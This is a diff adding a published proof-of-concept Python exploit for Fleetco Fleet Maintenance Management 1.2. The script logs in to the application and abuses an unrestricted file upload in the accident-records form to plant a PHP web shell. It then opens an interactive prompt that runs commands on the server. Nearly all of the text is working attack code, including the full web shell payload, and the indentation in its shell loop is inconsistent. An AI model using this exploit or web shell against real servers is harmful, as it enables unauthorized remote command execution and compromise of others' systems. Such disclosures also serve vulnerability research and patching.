@@ -1,0 +1,77 @@
+# Exploit Title: Fleetco Fleet Maintenance Management 1.2 - Remote Code Execution
+# Date: 2018-11-23
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Contact: https://pentest.com.tr
+# Vendor Homepage: https://www.fleetco.space
+# Software Link: http://www.fleetco.space/download/215/
+# Version: v1.2
+# Category: Webapps
+# Tested on: XAMPP for Linux 1.7.2
+# Software Description : Fleetco FMM is a free, web-based vehicle fleet maintenance management
+# system written in PHP with MySQL database backend.
+# Description : Fleetco 1.2 and lower versions allows to upload arbitrary ".php" files which
+# leads to a remote command execution on the remote server. Any authorized user is enough to exploit.
+# ==================================================================
+# PoC:
+
+#!/usr/bin/python
+
+import mechanize
+import sys
+import cookielib
+import requests
+import colorama
+from colorama import Fore
+
+print "\n[*] Fleetco Fleet Maintenance Management v1.2 - Remote Code Execution"
+print "[*] Vulnerability discovered by AkkuS"
+print "[*] My Blog - https://www.pentest.com.tr\n"
+if (len(sys.argv) != 2):
+    print "[*] Usage: poc.py <RHOST>"
+    exit(0)
+ 
+rhost = sys.argv[1]
+
+# User Information Input
+UserName = str(raw_input("User Name: "))
+Password = str(raw_input("Password: "))
+
+# Login into site
+print(Fore.BLUE + "+ [*] Loging in...")
+br = mechanize.Browser()
+br.set_handle_robots(False)
+
+# Cookie Jar
+cj = cookielib.LWPCookieJar()
+br.set_cookiejar(cj)
+
+br.open("http://"+rhost+"/login.php")
+assert br.viewing_html()
+br.select_form(name="form1")
+br.select_form(nr=0)
+br.form['username'] = UserName
+br.form['password'] = Password
+br.submit()
+
+# Where are you
+title = br.title()
+print (Fore.YELLOW + "+ [*] You're in "+title+" section of the app now")
+
+# Create Accident Records with multipart/form-data to RCE
+rce_headers = {"Content-Type": "multipart/form-data; boundary=---------------------------10664657171782352435254769348"}
+rce_data="-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_Fleet_1\"\r\n\r\nCargo Carriers\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_Vehicle_1\"\r\n\r\nBF1470\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_Type_1\"\r\n\r\nLorry\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_Date_1\"\r\n\r\n11/07/2018\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"type_Date_1\"\r\n\r\ndate2\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"type_Time_1\"\r\n\r\ntime\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_Driver_1\"\r\n\r\nAntony Croos\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_Details_1\"\r\n\r\ntest\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"type_Images_1\"\r\n\r\nupload2\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_Images_1\"; filename=\"RCE.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>\n\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"filename_Images_1\"\r\n\r\nRCE.php\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_EnteredBy_1\"\r\n\r\nMark Croos\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"value_SysDate_1\"\r\n\r\n2018-11-23 14:58:09\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nadded\r\n-----------------------------10664657171782352435254769348\r\nContent-Disposition: form-data; name=\"rndVal\"\r\n\r\n0.8040138072331872\r\n-----------------------------10664657171782352435254769348--\r\n"
+
+upload = requests.post("http://"+rhost+"/accidents_add.php?submit=1&", headers=rce_headers, cookies=cj, data=rce_data)
+if upload.status_code == 200:
+   print (Fore.GREEN + "+ [*] Shell successfully uploaded!")
+
+# Shell validation and exploit
+while True:
+      shellctrl = requests.get("http://"+rhost+"/files/RCE.php")
+      if shellctrl.status_code == 200:
+         Command = str(raw_input(Fore.WHITE + "shell> "))
+     URL = requests.get("http://"+rhost+"/files/RCE.php?cmd="+Command+"")
+            print URL.text
+      else:
+         print (Fore.RED + "+ [X] Unable to upload or access the shell")
+         sys.exit()
